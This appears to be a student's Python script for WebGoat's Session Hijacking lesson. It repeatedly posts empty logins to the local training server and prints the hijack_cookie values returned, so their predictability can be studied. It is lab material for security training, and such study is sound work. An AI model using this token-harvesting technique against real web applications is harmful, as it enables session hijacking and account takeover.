import requests

JSESSIONID = "0604661396E6A14A30C787C427A16109"

url = "http://127.0.0.1:8080/WebGoat/HijackSession/login"

for i in range(10):
    r = requests.post(
        url,
        headers={
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        },
        cookies={
            "JSESSIONID": JSESSIONID
        },
        data={
            "username": "",
            "password": ""
        },
        allow_redirects=False,
        timeout=5
    )

    cookie = r.headers.get("Set-Cookie", "")

    if "hijack_cookie=" in cookie:
        valor = cookie.split("hijack_cookie=", 1)[1].split(";", 1)[0]
        print(f"{i+1}: {valor}")
    else:
        print(f"{i+1}: hijack_cookie não encontrado | HTTP {r.status_code}")